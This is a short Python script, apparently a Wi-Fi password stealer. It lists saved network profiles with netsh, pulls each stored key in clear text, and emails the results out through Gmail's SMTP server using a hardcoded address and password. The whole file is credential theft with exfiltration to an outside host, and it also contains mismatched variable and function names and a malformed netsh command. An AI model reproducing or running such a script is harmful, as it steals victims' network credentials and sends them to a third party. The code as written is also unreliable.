import subprocess, smtplib, re

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

command = "netsh eth0 show profile"
network = subprocess.check_output(command, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
	command = "netsh eth0 show profile " + network_name + "key=clear"
	current_result = subprocess.check_output(command, shell=True)
	result = result + current_result

sendmail("ryloruby@gmail.com", "RubensRyland321!", result)
